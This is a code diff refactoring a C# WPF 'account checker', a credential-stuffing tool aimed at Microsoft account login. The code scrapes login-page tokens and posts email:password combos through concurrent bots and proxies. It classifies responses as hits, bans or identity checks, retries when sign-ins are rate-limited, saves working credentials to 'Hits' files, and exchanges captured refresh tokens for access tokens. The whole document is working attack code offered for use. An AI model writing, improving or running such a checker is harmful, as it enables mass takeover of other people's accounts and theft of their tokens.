@@ -1,8 +1,10 @@
 ﻿using System.Collections.Concurrent;
 using System.IO;
+using System.Net.Http;
 using Microsoft.Win32;
 using System.Windows;
 using AccountCheckerWPF.Enums;
+using AccountCheckerWPF.Helper;
 using AccountCheckerWPF.Managers;
 using AccountCheckerWPF.Models;
 using AccountCheckerWPF.Services.Interface;
@@ -23,7 +25,7 @@ namespace AccountCheckerWPF
         private int _identity = 0;
         private int _unknown = 0;
         private readonly ProxyManager _proxyManager;
-        private readonly AccountManager _accountManager ;
+        private readonly AccountManager _accountManager;
 
         private readonly IHttpServices _httpServices;
 
@@ -65,7 +67,7 @@ namespace AccountCheckerWPF
         {
             if (!int.TryParse(e.Text, out _))
             {
-                e.Handled = true; 
+                e.Handled = true;
             }
         }
 
@@ -111,7 +113,7 @@ namespace AccountCheckerWPF
                 Console.WriteLine("Please ensure account file exists!");
                 return;
             }
-            
+
             _httpServices.InitHttpClient();
 
             var hitsDirectory = "./Hits";
@@ -126,7 +128,7 @@ namespace AccountCheckerWPF
             }
 
             var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
-            
+
             await using var hitFileWriter = new StreamWriter(hitFilePath, false);
             var botCount = int.Parse(NumberOfBots.Text);
             _semaphore = new SemaphoreSlim(botCount, botCount);
@@ -163,133 +165,7 @@ namespace AccountCheckerWPF
                             continue;
                         }
 
-                        Retry:
-
-                        var email = account.Split(':')[0];
-                        var password = account.Split(':')[1];
-
-                        try
-                        {
-                            var getResponse = await _httpServices.SendGetRequestAsync();
-                            var bodyGet = await getResponse.Content.ReadAsStringAsync();
-
-                            var bk = ExtractValue(bodyGet, "bk=", "&");
-                            var contextid = ExtractValue(bodyGet, "contextid=", "&");
-                            var uaid = ExtractValue(bodyGet, "uaid=", "\"/>");
-                            var ppft = ExtractValue(bodyGet, "name=\"PPFT\" id=\"i0327\" value=\"", "\"");
-
-                            var postResponse =
-                                await _httpServices.SendPostRequestAsync(email, password, ppft, contextid, bk, uaid);
-                            var bodyPost = await postResponse.Content.ReadAsStringAsync();
-
-                            var cookies = new List<string>();
-                            if (postResponse.Headers.TryGetValues("Set-Cookie", out var cookieHeaders))
-                            {
-                                cookies = cookieHeaders.ToList();
-                            }
-
-                            // Key check logic
-                            if (bodyPost.Contains("Your account or password is incorrect.") ||
-                                bodyPost.Contains("That Microsoft account doesn't exist. Enter a different account") ||
-                                bodyPost.Contains("Sign in to your Microsoft account") ||
-                                bodyPost.Contains("gls.srf") ||
-                                bodyPost.Contains("timed out") ||
-                                bodyPost.Contains("account.live.com/recover?mkt") ||
-                                bodyPost.Contains("recover?mkt") ||
-                                bodyPost.Contains("get a new one") ||
-                                bodyPost.Contains("/cancel?mkt=") ||
-                                bodyPost.Contains("/Abuse?mkt="))
-                            {
-                                _fail++;
-                            }
-                            else if (bodyPost.Contains(",AC:null,urlFedConvertRename"))
-                            {
-                                _ban++;
-                            }
-                            else if (bodyPost.Contains("sign in too many times"))
-                            {
-                                _retry++;
-                                goto Retry;
-                            }
-                            else if (cookies.Contains("ANON") ||
-                                     cookies.Contains("WLSSC") ||
-                                     postResponse.RequestMessage.RequestUri.ToString()
-                                         .Contains("https://login.live.com/oauth20_desktop.srf?") ||
-                                     bodyPost.Contains("sSigninName") ||
-                                     bodyPost.Contains("privacynotice.account.microsoft.com"))
-                            {
-                                _success++;
-                            }
-                            else if (bodyPost.Contains("identity/confirm?mkt") ||
-                                     bodyPost.Contains("Email/Confirm?mkt"))
-                            {
-                                _identity++;
-                                var hitsDirectory = "Hits";
-                                var identityFilePath = Path.Combine(hitsDirectory, "identity.txt");
-
-                                if (!Directory.Exists(hitsDirectory))
-                                {
-                                    Directory.CreateDirectory(hitsDirectory);
-                                }
-
-                                if (!File.Exists(identityFilePath))
-                                {
-                                    try
-                                    {
-                                        File.Create(identityFilePath).Close();
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        Console.WriteLine($"Error creating identity.txt: {ex.Message}");
-                                        return;
-                                    }
-                                }
-
-                                try
-                                {
-                                    await using (var file = new StreamWriter(identityFilePath, true))
-                                    {
-                                        await file.WriteLineAsync($"{email}:{password}");
-                                    }
-                                    
-                                    goto Complete;
-                                }
-                                catch (Exception ex)
-                                {
-                                    Console.WriteLine($"Error: {ex.Message}");
-                                    return;
-                                }
-                            }
-                            else
-                            {
-                                _unknown++;
-                                goto Retry;
-                            }
-                            
-                            var ci = GetCookieValue("MSPCID", cookies);
-                            var cid = ci?.ToUpper();
-
-                            var address = postResponse.RequestMessage.RequestUri.ToString();
-                            var refreshToken = ExtractValueBetween(address, "refresh_token=", "&");
-
-                            if (refreshToken != null)
-                            {
-                                var getAccessTokenResponse =
-                                    await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
-                                var getAccessTokenResponseBody =
-                                    await getAccessTokenResponse.Content.ReadAsStringAsync();
-                                var json = JObject.Parse(getAccessTokenResponseBody);
-                                var accessToken = json["access_token"];
-                            }
-                        }
-                        catch
-                        {
-                            _retry++;
-                            goto Retry;
-                        }
-
-                        Complete:
-                        _globalindex++;
+                        await ProcessAccountAsync(account);
                     }
                 });
             }
@@ -299,37 +175,91 @@ namespace AccountCheckerWPF
             }
         }
 
-        private string ExtractValue(string source, string start, string end)
+        private async Task ProcessAccountAsync(string account)
         {
-            var startIndex = source.IndexOf(start, StringComparison.Ordinal);
-            if (startIndex == -1) return string.Empty;
-            startIndex += start.Length;
-            var endIndex = source.IndexOf(end, startIndex, StringComparison.Ordinal);
-            if (endIndex == -1) return string.Empty;
-            return source.Substring(startIndex, endIndex - startIndex);
-        }
+            var (email, password) = CommonHelper.ParseAccountStr(account);
 
-        private string? GetCookieValue(string cookieName, List<string>? cookies)
-        {
-            foreach (var cookie in cookies)
+            while (true)
             {
-                var parts = cookie.Split(';');
-                var cookiePart = parts.FirstOrDefault(p =>
-                    p.Trim().StartsWith(cookieName + "=", StringComparison.OrdinalIgnoreCase));
-                if (cookiePart != null)
+                try
                 {
-                    return cookiePart.Split('=')[1];
+                    var responseGetParamsFromLoginPage = await _httpServices.SendGetParamsFromLoginPageRequestAsync();
+                    var paramsFromLoginPage =
+                        CommonHelper.GetParamsFromLoginPage(await responseGetParamsFromLoginPage.Content
+                            .ReadAsStringAsync());
+
+                    var responsePostLogin = await _httpServices.SendPostLoginRequestAsync(email, password,
+                        paramsFromLoginPage.PPFT,
+                        paramsFromLoginPage.ContextId, paramsFromLoginPage.BK, paramsFromLoginPage.UAID);
+
+                    var responseBodyPostLogin = await responsePostLogin.Content.ReadAsStringAsync();
+
+                    var retryStatus =
+                        await HandlePostLoginResponse(responsePostLogin, responseBodyPostLogin, email, password);
+                    if (retryStatus != RetryStatus.Retry)
+                        break;
+                }
+                catch
+                {
+                    _retry++;
                 }
             }
-
-            return null; 
         }
 
-        private string? ExtractValueBetween(string input, string leftDelim, string rightDelim)
+        private async Task<RetryStatus> HandlePostLoginResponse(HttpResponseMessage postResponse, string bodyPost,
+            string email, string password)
         {
-            var startIndex = input.IndexOf(leftDelim, StringComparison.Ordinal) + leftDelim.Length;
-            var endIndex = input.IndexOf(rightDelim, startIndex, StringComparison.Ordinal);
-            return startIndex > -1 && endIndex > startIndex ? input.Substring(startIndex, endIndex - startIndex) : null;
+            var cookies = CommonHelper.GetCookies(postResponse);
+            var responseStatus = CommonHelper.EvaluatePostLoginResponse(bodyPost, cookies, postResponse);
+
+            switch (responseStatus)
+            {
+                case LoginKeyCheckStatus.Fail:
+                    _fail++;
+                    return RetryStatus.Done;
+
+                case LoginKeyCheckStatus.Ban:
+                    _ban++;
+                    return RetryStatus.Done;
+
+                case LoginKeyCheckStatus.Retry:
+                    _retry++;
+                    return RetryStatus.Retry;
+
+                case LoginKeyCheckStatus.Success:
+                    _success++;
+                    await HandleSuccessResponse(postResponse, cookies);
+                    return RetryStatus.Done;
+
+                case LoginKeyCheckStatus.Identity:
+                    _identity++;
+                    await CommonHelper.WriteToIdentityFile(email, password);
+                    return RetryStatus.Done;
+
+                case LoginKeyCheckStatus.Unknown:
+                    _unknown++;
+                    _retry++;
+                    return RetryStatus.Retry;
+
+                default:
+                    return RetryStatus.Done;
+            }
+        }
+
+        private async Task HandleSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
+        {
+            var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();
+
+            var address = postResponse.RequestMessage.RequestUri.ToString();
+            var refreshToken = CommonHelper.ExtractValueBetween(address, "refresh_token=", "&");
+
+            if (refreshToken != null)
+            {
+                var getAccessTokenResponse = await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
+                var getAccessTokenResponseBody = await getAccessTokenResponse.Content.ReadAsStringAsync();
+                var json = JObject.Parse(getAccessTokenResponseBody);
+                var accessToken = json["access_token"];
+            }
         }
     }
 }
